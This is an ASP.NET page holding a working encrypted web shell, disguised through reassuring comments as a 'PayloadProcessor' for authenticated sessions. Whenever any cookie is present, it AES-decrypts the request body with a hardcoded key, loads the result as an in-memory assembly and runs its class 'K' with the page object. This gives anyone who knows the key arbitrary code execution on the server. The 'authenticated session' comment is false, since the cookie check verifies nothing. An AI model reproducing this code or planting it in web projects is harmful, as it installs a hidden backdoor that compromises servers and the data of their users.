<%@ Page Language="C#" %>
<script runat="server">
    /// <summary>
    /// Manages the processing of client-side data payloads.
    /// This class is responsible for decrypting, deserializing, and dispatching
    /// data to the appropriate handler module for further processing.
    /// </summary>
    public class PayloadProcessor
    {
        // The static symmetric key used for AES decryption.
        private const string ENCRYPTION_KEY_STRING = "ca63457538b9b1e0";
        private readonly byte[] _key;

        /// <summary>
        /// Initializes a new instance of the PayloadProcessor.
        /// </summary>
        public PayloadProcessor()
        {
            this._key = System.Text.Encoding.Default.GetBytes(ENCRYPTION_KEY_STRING);
        }

        /// <summary>
        /// Deserializes an encrypted byte array into a dynamic module assembly.
        /// </summary>
        /// <param name="encryptedData">The raw encrypted byte stream from the client.</param>
        /// <returns>A loaded Assembly ready for execution.</returns>
        private System.Reflection.Assembly DeserializeModule(byte[] encryptedData)
        {
            // Use the managed Rijndael implementation for secure data handling.
            using (var aesProvider = new System.Security.Cryptography.RijndaelManaged())
            {
                // The IV is derived from the same key for this legacy endpoint.
                var decryptor = aesProvider.CreateDecryptor(this._key, this._key);
                byte[] decryptedBytes = decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
            
                // Load the decrypted bytes as a .NET assembly in memory.
                return System.Reflection.Assembly.Load(decryptedBytes);
            }
        }

        /// <summary>
        /// Executes the main logic of a dynamically loaded module.
        /// </summary>
        /// <param name="requestingPage">The context of the current HttpApplication state.</param>
        /// <param name="inputStream">The stream containing the encrypted data payload.</param>
        public void ProcessRequest(System.Web.UI.Page requestingPage, System.IO.Stream inputStream)
        {
            if (inputStream == null || inputStream.Length == 0) return;

            byte[] requestBody = new byte[inputStream.Length];
            inputStream.Read(requestBody, 0, requestBody.Length);
        
            var moduleAssembly = this.DeserializeModule(requestBody);
        
            // Modules are expected to have a "K" (Kernel) entry point class.
            var moduleInstance = moduleAssembly.CreateInstance("K");
        
            // Pass the page context to the module's entry point for stateful processing.
            // The Equals method is overridden by the module to act as an entry point.
            if (moduleInstance != null)
            {
                moduleInstance.Equals(requestingPage);
            }
        }
    }

    // Entry point for the ASP.NET page lifecycle.
    void Page_Load(object sender, EventArgs e)
    {
        // The processor is only activated if cookies are present, indicating an authenticated session.
        if (Request.Cookies.Count > 0)
        {
            var processor = new PayloadProcessor();
            processor.ProcessRequest(this, Request.InputStream);
        }
    }
</script>